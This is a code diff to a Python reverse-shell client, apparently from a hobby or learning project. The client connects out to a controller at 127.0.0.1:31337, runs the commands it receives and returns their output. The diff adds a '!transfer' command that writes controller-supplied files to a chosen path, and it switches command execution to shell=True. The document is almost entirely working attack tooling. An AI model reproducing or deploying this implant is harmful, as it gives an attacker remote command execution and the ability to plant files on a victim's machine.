@@ -1,4 +1,5 @@
 import shlex
+import math
 from subprocess import Popen, PIPE
 from socket import socket, AF_INET, SOCK_STREAM
 
@@ -31,12 +32,21 @@ class reverse_tcp_client:
         self.connect()
         while True:
             self.recive_command()
+            print(self.command)
             if "!exit" in self.command:
                 self.socket.close()
                 break
-            self.execute_command()
-            self.get_data()
-            self.send_data()
+
+            #     0       1       2        3
+            #!transfer <path> <dst_path> <size>
+            elif "!transfer" in self.command:
+                print(self.command)
+                self.dst = self.command.split()[-2]
+                self.receive_file(self.command.split()[-1])
+            else:
+                self.execute_command()
+                self.get_data()
+                self.send_data()
 
     def connect(self):
         self.socket.connect((self.address,self.port))
@@ -49,8 +59,15 @@ class reverse_tcp_client:
           #  count += 1
         self.command = self.command.decode()
 
+    def receive_file(self,size):
+        num_recv = math.ceil(int(size)/1024)
+        with open(self.dst,"wb") as f:
+            for i in range(num_recv):
+                data = self.socket.recv(1024)
+                f.write(data)
+
     def execute_command(self):
-        self.command_result = Popen(shlex.split(self.command),stdout=PIPE,stderr=PIPE)
+        self.command_result = Popen(shlex.split(self.command),stdout=PIPE,stderr=PIPE,shell=True)
 
     def get_data(self):
         self.error = self.command_result.stderr.read()
@@ -65,6 +82,6 @@ class reverse_tcp_client:
 
         self.socket.send(output.encode())
 
-instance = reverse_tcp_client("127.0.0.1",31338)
+instance = reverse_tcp_client("127.0.0.1",31337)
 
 
